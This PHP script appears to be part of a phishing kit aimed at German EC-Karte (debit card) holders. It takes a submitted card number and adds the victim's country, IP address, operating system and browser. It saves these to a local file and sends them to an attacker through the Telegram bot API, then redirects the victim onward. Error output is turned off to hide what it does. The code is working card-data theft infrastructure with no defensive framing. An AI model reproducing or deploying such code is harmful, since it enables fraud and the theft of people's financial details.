<?php
session_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('LOG_SMS_errors', '0');

include('../Config/911.php');
include('../Config/COUNTRY.php');
include('../Config/SYS.php');
include('../Config/TELEGRMAT.php');

if (isset($_POST['submit'])) {
    $message = "=====|ECKARTE-SPV|=====\n";
    $message .= "= EC-Karte : ".$_POST['ec_card_num']."\n";
    $message .= "= VICO  : #$get_user_country\n";
    $message .= "= VICIP : $ip\n";
    $message .= "= VICSY : $user_os\n";
    $message .= "= VICBR : $user_browser\n";
    $message .= "= TIME  : $date\n";
    $message .= "=========================\n";

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../D.php?cred=1sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
    exit;
}
?>
